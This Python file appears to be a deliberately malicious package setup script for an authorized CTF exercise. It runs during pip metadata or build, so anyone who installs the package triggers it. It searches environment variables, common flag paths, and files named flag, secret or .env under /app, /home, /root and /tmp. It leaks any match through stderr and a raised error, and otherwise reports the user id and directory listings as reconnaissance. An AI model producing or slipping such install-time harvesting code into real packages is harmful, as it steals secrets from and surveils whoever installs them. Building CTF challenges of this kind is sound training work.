# Authorized CTF exercise: this sdist executes during pip metadata/build.
# Do not install on a personal system.
import os
import re
import sys
from pathlib import Path

PAT = re.compile(rb'(?:ALGOLYMP|FLAG|CTF)\{[^\r\n}]{1,256}\}', re.I)
checked = set()
found = []


def check_bytes(source, data):
    match = PAT.search(data)
    if match:
        flag = match.group(0).decode('utf-8', 'replace')
        found.append((source, flag))


def check_file(path):
    path = str(path)
    if path in checked:
        return
    checked.add(path)
    try:
        st = os.stat(path)
        if not (os.path.isfile(path) and st.st_size <= 1024 * 1024):
            return
        with open(path, 'rb') as fd:
            check_bytes(path, fd.read())
    except (OSError, ValueError):
        pass


# Environment values: only show strings matching the CTF flag format.
for key, val in os.environ.items():
    check_bytes('env:' + key, val.encode('utf-8', 'replace'))

# Common CTF flag locations.
for base in ('/flag', '/flag.txt', '/app/flag', '/app/flag.txt',
             '/home/ctf/flag', '/home/ctf/flag.txt', '/root/flag',
             '/root/flag.txt', '/challenge/flag', '/challenge/flag.txt',
             '/srv/flag', '/srv/flag.txt', '/run/secrets/flag',
             '/tmp/flag', '/tmp/flag.txt', '/workspace/flag.txt',
             '/opt/flag', '/opt/flag.txt', '/var/flag', '/var/flag.txt'):
    check_file(base)

# Limit enumeration to plausible challenge locations; don't descend into OS internals.
for root in ('/app', '/home', '/root', '/challenge', '/srv',
             '/run/secrets', '/workspace', '/opt', '/tmp'):
    if not os.path.isdir(root):
        continue
    root_level = root.rstrip('/').count('/')
    for directory, dirs, files in os.walk(root):
        depth = directory.count('/') - root_level
        if depth >= 4:
            dirs[:] = []
        if len(checked) > 1500 or found:
            break
        dirs[:] = [d for d in dirs if d not in
                   ('node_modules', '.git', '__pycache__', 'site-packages', 'venv', '.venv')]
        for filename in files:
            if filename.lower().startswith(('flag', 'secret')) or filename.lower().endswith(('.env', '.flag')):
                check_file(os.path.join(directory, filename))
        if found:
            break

if found:
    for origin, flag in found:
        print('[EVILPIP_FLAG] ' + flag + ' [from ' + origin + ']', file=sys.stderr, flush=True)
    raise RuntimeError('[EVILPIP_FLAG] ' + found[0][1])
else:
    def brief(path):
        try:
            return ','.join(sorted(os.listdir(path))[:35])
        except Exception as exc:
            return type(exc).__name__
    report = ('uid=%d cwd=%s root=[%s] app=[%s] home=[%s] checked=%d'
              % (os.getuid(), os.getcwd(), brief('/'), brief('/app'),
                 brief('/home'), len(checked)))
    print('[EVILPIP_RECON] ' + report, file=sys.stderr, flush=True)
    raise RuntimeError('[EVILPIP_RECON] ' + report)
